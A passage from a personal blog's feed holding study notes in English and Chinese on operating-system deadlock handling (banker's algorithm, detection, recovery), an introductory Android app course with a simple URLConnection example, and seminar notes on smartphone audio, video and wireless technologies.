&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;\begin{align}  
&amp;amp; \text { If } P_{i} \text{ resource needs are not immediately available, } \\  
&amp;amp; \text{ then } P_{i} \text{ can wait until all } P_{j} \text{ have finished. } \\  
&amp;amp; \text{     When } P_{j} \text{ is finished, } \\  
&amp;amp; P_{i} \text{ can obtain needed resources, execute, return allocated resources, and terminate. } \\  
&amp;amp; \text{     When } P_{i} \text{ terminates, } P_{i+1} \text{ can obtain its needed resources, and so on } \\  
\end{align}  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Basic Facts&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;If a system is in safe state =&amp;gt; no deadlocks  &lt;/li&gt;
&lt;li&gt;If a system is in unsafe state =&amp;gt; possibility of deadlock  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Avoidance =&amp;gt; ensure that a system will never enter an unsafe state.&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Avoidance algorithms&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Single&lt;/strong&gt; instance of a resource type =&amp;gt; Use a &lt;strong&gt;resource-allocation graph&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Multiple&lt;/strong&gt; instances of a resource type =&amp;gt; Use &lt;strong&gt;the banker’s algorithm&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Resource-Allocation Graph Scheme&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;\begin {align}  
&amp;amp; \text{ Claim edge } P_{i} \rightarrow R_{j} \text{ indicated that process } P_{j} \text{ may request resource } R_{j} \text{ ; }\\  
&amp;amp; \text{ represented by a dashed line. }  
\end {align}  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Claim edge converts to request edge when a process requests a resource  &lt;/li&gt;
&lt;li&gt;Request edge converted to an assignment edge when the resource is allocated to the process  &lt;/li&gt;
&lt;li&gt;When a resource is released by a process, assignment edge reconverts to a claim edge  &lt;/li&gt;
&lt;li&gt;Resources must be claimed a &lt;strong&gt;priori&lt;/strong&gt; in the system  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Resource Allocation Graph&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Resouce Allocation Graph 3" src="/files/os-ch7-deadlocks/resource-allocation-graph-3.png" /&gt;  &lt;/p&gt;
&lt;h4&gt;Unsafe State Resource Allocation Graph&lt;/h4&gt;
&lt;p&gt;&lt;img alt="Unsafe State Resource Allocation Graph" src="/files/os-ch7-deadlocks/unsafe-state-resource-allocation-graph.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;Resource-Allocation Graph Algorithm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;The request can be granted only if converting the request edge to an assignment edge does not result in the formation of a cycle in the resource allocation graph  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Banker’s Algorithm&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;檢查之後有沒有可能進到 Unsafe State  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Multiple instances  &lt;/li&gt;
&lt;li&gt;Each process must a priori claim maximum use  &lt;/li&gt;
&lt;li&gt;When a process requests a resource it may have to wait  &lt;/li&gt;
&lt;li&gt;When a process gets all its resources it must return them in a finite amount of time  &lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Data Structures for the Banker’s Algorithm&lt;/h5&gt;
&lt;p&gt;&lt;img alt="Data Structures for the Banker’s Algorithm" src="/files/os-ch7-deadlocks/bankers-algorithm.png" /&gt;  &lt;/p&gt;
&lt;h4&gt;Safety Algorithm&lt;/h4&gt;
&lt;p&gt;&lt;img alt="Safety Algorithm" src="/files/os-ch7-deadlocks/safety-algorithm.png" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;process 有可能還需要 resource, 可以由 work 提供  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;￼Resource-Request Algorithm for Process Pi&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Request = request vector for process P[i]  &lt;/span&gt;
&lt;span class="c1"&gt;# If Request[i][j] = k then,  &lt;/span&gt;
&lt;span class="c1"&gt;# process P[i] wants k instances of resource type R[j]  &lt;/span&gt;

&lt;span class="c1"&gt;# 1.  &lt;/span&gt;
&lt;span class="n"&gt;If&lt;/span&gt; &lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;Need&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;step2&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt;  
&lt;span class="c1"&gt;# since process has exceeded its maximum claim  &lt;/span&gt;

&lt;span class="c1"&gt;# 2.  &lt;/span&gt;
&lt;span class="n"&gt;If&lt;/span&gt; &lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;Available&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;step3&lt;/span&gt;  
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;P&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;wait&lt;/span&gt;  
&lt;span class="c1"&gt;# since resources are not available  &lt;/span&gt;

&lt;span class="c1"&gt;# 3.  &lt;/span&gt;
&lt;span class="c1"&gt;# Pretend to allocate requested resources to Pi  &lt;/span&gt;
&lt;span class="c1"&gt;# by modifying the state as follows:  &lt;/span&gt;

&lt;span class="n"&gt;Available&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Available&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt; &lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;Allocation&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Allocation&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;Need&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Need&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt; &lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;If safe =&amp;gt; the resources are allocated to Pi  &lt;/li&gt;
&lt;li&gt;If unsafe =&amp;gt; Pi must wait, and the old resource-allocation state is restored  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Available == 當下系統可用的 Resource 的量&lt;br /&gt;
Resource-Request Algorithm 很少在用，主要的原因是因為 Avaliable 不好估算，如果 Avaliable 無法得知的話，這個 Algorithm 基本上沒什麼用，這邊只是表達一下觀念。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Deadlock Detection&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Allow system to enter deadlock state  &lt;/li&gt;
&lt;li&gt;Detection algorithm  &lt;/li&gt;
&lt;li&gt;Recovery scheme  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Single Instance of Each Resource Type&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Single Instance of Each Resource Type" src="/files/os-ch7-deadlocks/single-instance-of-each-resource-type.jpg" /&gt;  &lt;/p&gt;
&lt;h3&gt;Resource-Allocation Graph and Wait-for Graph&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Resource-Allocation Graph and Wait-for Graph" src="/files/os-ch7-deadlocks/resource-allocation-graph-and-wait-for-graph.jpg" /&gt;  &lt;/p&gt;
&lt;h3&gt;Several Instances of a Resource Type&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Several Instances of a Resource Type" src="/files/os-ch7-deadlocks/several-instances-of-a-resource-type.jpg" /&gt;  &lt;/p&gt;
&lt;h3&gt;Detection Algorithm&lt;/h3&gt;
&lt;p&gt;&lt;img alt="Detection Algorithm 1" src="/files/os-ch7-deadlocks/detection-algorithm-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="Detection Algorithm 2" src="/files/os-ch7-deadlocks/detection-algorithm-2.jpg" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Algorithm requires an order of O(m * n^2) operations to detect whether the system is in deadlocked state  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;Example of Detection Algorithm&lt;/h4&gt;
&lt;p&gt;&lt;img alt="Example of Detection Algorithm 1" src="/files/os-ch7-deadlocks/example-of-detection-algorithm-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="Example of Detection Algorithm 2" src="/files/os-ch7-deadlocks/example-of-detection-algorithm-2.jpg" /&gt;  &lt;/p&gt;
&lt;h4&gt;Detection-Algorithm Usage&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;When, and how often, to invoke depends on:  &lt;ul&gt;
&lt;li&gt;How often a deadlock is likely to occur?  &lt;/li&gt;
&lt;li&gt;How many processes will need to be rolled back?  &lt;ul&gt;
&lt;li&gt;one for each disjoint cycle  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If detection algorithm is invoked arbitrarily, there may be many cycles in the resource graph and so we would not be able to tell which of the many deadlocked processes “caused” the deadlock  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Recovery from Deadlock&lt;/h2&gt;
&lt;h3&gt;Process Termination&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Abort all deadlocked processes  &lt;/li&gt;
&lt;li&gt;Abort one process at a time until the deadlock cycle is eliminated  &lt;/li&gt;
&lt;li&gt;In which order should we choose to abort?  &lt;ul&gt;
&lt;li&gt;Priority of the process  &lt;/li&gt;
&lt;li&gt;How long process has computed, and how much longer to completion  &lt;/li&gt;
&lt;li&gt;Resources the process has used  &lt;/li&gt;
&lt;li&gt;Resources process needs to complete  &lt;/li&gt;
&lt;li&gt;How many processes will need to be terminated  &lt;/li&gt;
&lt;li&gt;Is process interactive or batch?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Resource Preemption&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Selecting a victim =&amp;gt; minimize cost  &lt;/li&gt;
&lt;li&gt;Rollback =&amp;gt; return to some safe state, restart process for that state  &lt;/li&gt;
&lt;li&gt;Starvation =&amp;gt; same process may always be picked as victim, include number of rollback in cost factor  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Operating System"></category><category term="Deadlock"></category></entry><entry><title>SNTT week8 - Android App 入門</title><link href="https://blog.m157q.tw/posts/2013/11/12/sntt-week8-introduction-to-android-app/" rel="alternate"></link><published>2013-11-12T13:01:00+08:00</published><updated>2013-11-12T13:01:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-12:posts/2013/11/12/sntt-week8-introduction-to-android-app/</id><summary type="html">&lt;h1&gt;SNTT == Social Network Technology and Trend&lt;/h1&gt;
&lt;h1&gt;Android App 入門&lt;/h1&gt;
&lt;h2&gt;How to work on a Framework&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;通常其基礎功能以預先完成且可執行  &lt;/li&gt;
&lt;li&gt;有許多 Hook 讓我們能夠增加其行為 (寫好的 library 可以取用 function)  &lt;/li&gt;
&lt;li&gt;使傳統的 flow driven 轉變成 event driven  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Java&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;物件導向  &lt;/li&gt;
&lt;li&gt;靜態、強型別、強分型  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;基礎 Object Orientation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Object  &lt;ul&gt;
&lt;li&gt;Attribute  &lt;/li&gt;
&lt;li&gt;Method  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Android Development&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Java Development Kit (JDK)  &lt;/li&gt;
&lt;li&gt;Android SDK  &lt;/li&gt;
&lt;li&gt;Eclipse  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Install&lt;/h3&gt;
&lt;h3&gt;Setup Simulator&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Android Simulator 的速度看起來非常悲劇  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Create An App&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Application Name  &lt;/li&gt;
&lt;li&gt;Project Name  &lt;/li&gt;
&lt;li&gt;Package Name (Unique, 不可跟別人衝突)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;App 如何執行?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;一個 App 會產生一個獨立的 VM, run 在一個 process 裡面  &lt;/li&gt;
&lt;li&gt;利用 JNI 和其他 App 溝通  &lt;/li&gt;
&lt;li&gt;必須設定權限  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;*.apk 的內容物&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Android SDK app  &lt;ul&gt;
&lt;li&gt;Android manifest  &lt;/li&gt;
&lt;li&gt;Dalvik class  &lt;/li&gt;
&lt;li&gt;Resources  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Android NDK app&lt;br /&gt;
        + Android manifest  &lt;ul&gt;
&lt;li&gt;Dalvik class  &lt;/li&gt;
&lt;li&gt;Resources  &lt;/li&gt;
&lt;li&gt;Libraries &amp;amp; JNI  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Application Components&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Activities  &lt;ul&gt;
&lt;li&gt;包含螢幕 UI 的呈現  &lt;/li&gt;
&lt;li&gt;一個 App 會有很多 Activity  &lt;/li&gt;
&lt;li&gt;可以想像成一個 UI 畫面就是一個 Activity  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Services  &lt;ul&gt;
&lt;li&gt;能在背景持續執行  &lt;/li&gt;
&lt;li&gt;不能寫太 heavy load 的東西，不然會太耗電  &lt;/li&gt;
&lt;li&gt;通常用在需要持續連接網路的程式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content providers  &lt;ul&gt;
&lt;li&gt;資料中心  &lt;/li&gt;
&lt;li&gt;會提供一些系統裡面的資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Broadcast receivers  &lt;ul&gt;
&lt;li&gt;訊號接收器  &lt;/li&gt;
&lt;li&gt;分成兩種： 有特定接收者 vs 無特定接收者  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Single Activity - 修改 UI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Callback  &lt;ul&gt;
&lt;li&gt;將動作寫成 callback 等待 listener 呼叫  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Listener  &lt;ul&gt;
&lt;li&gt;負責等待事件的發生，並呼叫相應的 callback  &lt;/li&gt;
&lt;li&gt;OnClick()  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Internet&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;NetworkOnMainThreadException: (After Android 4.0)  &lt;ul&gt;
&lt;li&gt;Any potentially long task that may hang your application should not be handled in the main thread.  &lt;/li&gt;
&lt;li&gt;Android 4.0 之後不允許可能會花長時間的應用程式在 main thread，下載東西就是其中一種。  &lt;/li&gt;
&lt;li&gt;解決辦法: 使用其他的 thread 來進行資料傳輸  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a href="https://developer.android.com/reference/java/net/URLConnection.html"&gt;URLConnection&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;example:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;//建立新的網址物件  &lt;/span&gt;
&lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://example.com/a.txt&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  

&lt;span class="c1"&gt;//建立網址連線的物件  &lt;/span&gt;
&lt;span class="n"&gt;URLConnection&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;openConnection&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;  

&lt;span class="c1"&gt;//連接該網址  &lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;connect&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;  

&lt;span class="c1"&gt;//建立一個字串物件，將檔案內容接上這個 string 物件  &lt;/span&gt;
&lt;span class="n"&gt;StringBuilder&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StringBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;  
&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;  
    &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;read&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;append&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;  
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;  
&lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Multiple Threads&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Thread &amp;amp; ThreadHandler  &lt;ul&gt;
&lt;li&gt;Thread: 專門負責實際上的運作，無法更改UI  &lt;/li&gt;
&lt;li&gt;ThreadHandler: 負責 Thread 和 UI 之間的溝通  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;mThread, mThreadHandler, removeCallbacks  &lt;/p&gt;
&lt;h3&gt;View&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ScrollView  &lt;/li&gt;
&lt;li&gt;TextView  &lt;/li&gt;
&lt;li&gt;RelativeView  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Objects&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Button  &lt;/li&gt;
&lt;li&gt;Timer  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;寫 App 必須非常重視 UX (User Experience)  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="Java"></category><category term="Android"></category></entry><entry><title>資訊工程研討 - Theoretical Foundation Behind Strong Growth of Smartphones</title><link href="https://blog.m157q.tw/posts/2013/11/12/computer-science-seminars-theoretical-foundation-behind-strong-growth-of-smartphones/" rel="alternate"></link><published>2013-11-12T07:14:00+08:00</published><updated>2013-11-12T07:14:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-11-12:posts/2013/11/12/computer-science-seminars-theoretical-foundation-behind-strong-growth-of-smartphones/</id><summary type="html">&lt;h2&gt;Title: Theoretical Foundation Behind Strong Growth of Smartphones&lt;/h2&gt;
&lt;h2&gt;Speaker: &lt;a href="http://www.ee.washington.edu/faculty/hwang/"&gt;黃正能 / 華盛頓大學電機系教授&lt;/a&gt;&lt;/h2&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Qualcomm's Awareness  &lt;/li&gt;
&lt;li&gt;AT&amp;amp;T's Digital Home/Life  &lt;/li&gt;
&lt;li&gt;Wearable Computing and Bendable Display  &lt;ul&gt;
&lt;li&gt;Google glass - 華大教授三、四年前被 google 挖角過去做的東西  &lt;/li&gt;
&lt;li&gt;Samsung bendable display  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.apple.com/airplay/"&gt;Apple TV AirPlay&lt;/a&gt; and &lt;a href="http://www.google.com/intl/en/chrome/devices/chromecast/#netflix"&gt;Google Chromecast&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;display device 不需要永遠都在 mobile device 上  &lt;/li&gt;
&lt;li&gt;google chromecast USD$35.00  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transparent Smart Windows  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;What are Theoretical Foundations behind these technology?&lt;/h2&gt;
&lt;h3&gt;Energy Efficient + CPU, GPU&lt;/h3&gt;
&lt;h4&gt;SoC Based Powerful Engine&lt;/h4&gt;
&lt;p&gt;Qualcomm SnapDragon 600  &lt;/p&gt;
&lt;h4&gt;CPU + GPU&lt;/h4&gt;
&lt;p&gt;根據不同狀況使用 CPU 或 GPU  &lt;/p&gt;
&lt;h4&gt;Power Efficient Design&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;省電  &lt;/li&gt;
&lt;li&gt;Thermal Design Power  &lt;/li&gt;
&lt;li&gt;Leakage 的耗電越來越大  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Run-Time System-Level Energy Self-Optimization&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Optimization - 控管 Device 內的各個 chip  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Standarlize&lt;/h3&gt;
&lt;h3&gt;Audio&lt;/h3&gt;
&lt;h4&gt;Human Psychoacoustics&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Hearing Sensitivity - 只聽得到對 20~20000 Hz 的頻率  &lt;/li&gt;
&lt;li&gt;Frequency Masking - 某個頻率的聲音特別明顯的時候，會聽不到這段時間其他頻率的聲音  &lt;ul&gt;
&lt;li&gt;Saving More Bits with Frequency Masking  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Temporal Masking - 某段時間音量特別大的話，會聽不到在這段時間前後的其他聲音  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;利用上述這三點作為音頻壓縮技術的基礎  &lt;/p&gt;
&lt;h4&gt;Audio Coding Standards&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;MP3 (128Kbps)  &lt;/li&gt;
&lt;li&gt;AC3  &lt;/li&gt;
&lt;li&gt;AAC (64Kbps)  &lt;/li&gt;
&lt;li&gt;HE-AAC (48 or 24 Kbps)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Video&lt;/h3&gt;
&lt;h4&gt;Digital Video Coding&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Digitize  &lt;/li&gt;
&lt;li&gt;Infra-frame compression (Simlliar to JPEG)  &lt;ul&gt;
&lt;li&gt;A DCT Based Intra-Frame Encoding  &lt;ul&gt;
&lt;li&gt;img -&amp;gt; DCT -&amp;gt; Quantize -&amp;gt; Zig-zag -&amp;gt; ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Coding Block  &lt;/li&gt;
&lt;li&gt;Motion Vector Search - 拿 difference 去作 DCD 再作壓縮，省略掉重複的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Symbol Entropy coding - 機率因素  &lt;/li&gt;
&lt;li&gt;Rate Control  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Video Coding Evolution&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;MPEG-2 - 1994  &lt;/li&gt;
&lt;li&gt;AVC/H.264 - 2003  &lt;/li&gt;
&lt;li&gt;AVC Scalable Extension  &lt;/li&gt;
&lt;li&gt;HEVC/H.265 - 2013&lt;br /&gt;
H.265 用 50% 的 bitrate 壓縮出來的效果跟 H.264 100% bitrate 差不多  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Multi- and Free-View of Video Scenes&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Users can dynamic select and viewpoint they want to use  &lt;/li&gt;
&lt;li&gt;Virtual Viewpoint Not Captured by the real camera - 可以透過多個 Camera 模擬出實際上不是由真的 Camera 拍攝出來的視角  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;What will be 5G?&lt;/h2&gt;
&lt;p&gt;1991 - Voice - SMS - 2G&lt;br /&gt;
2001 - App - SNS - 3G&lt;br /&gt;
2009 - Big Data - Cloud - 4G&lt;br /&gt;
2020 - ??? - ??? - 5G #沒記到- -"  &lt;/p&gt;
&lt;h3&gt;Earlier Generations of Mobile Technologies&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;2G  &lt;/li&gt;
&lt;li&gt;CDMA  &lt;/li&gt;
&lt;li&gt;Hive technology  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Toward ALL-IP 4G Wireless&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LTE (Long Term Evolution) of 3GPP  &lt;/li&gt;
&lt;li&gt;WiMAX  &lt;/li&gt;
&lt;li&gt;4G  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;OFDM &amp;amp; OFDMA&lt;/h3&gt;
